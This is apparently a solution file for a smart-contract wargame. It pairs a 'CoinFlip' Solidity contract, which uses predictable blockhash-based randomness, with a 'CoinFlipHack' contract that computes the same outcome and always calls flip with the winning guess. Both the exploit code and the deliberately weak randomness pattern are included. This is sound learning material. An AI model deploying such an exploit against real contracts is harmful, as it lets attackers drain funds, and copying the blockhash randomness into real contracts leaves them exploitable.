// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '/contracts/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}


contract CoinFlipHack {
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
     // get the instance of your contract.
     CoinFlip ogContract = CoinFlip(**your instance address**);
     uint256 lastHash;
     using SafeMath for uint256;
      
     function fliphack() public {
        // get the hash of the previous block
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        // if you call flipHack() twice in the same block it will revert
        if (lastHash == blockValue) {
          revert();
        }
    
        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
    
        // call the original contract based on number generated
        if (side == true) {
            ogContract.flip(true);
        } else {
            ogContract.flip(false);
        }
      }
}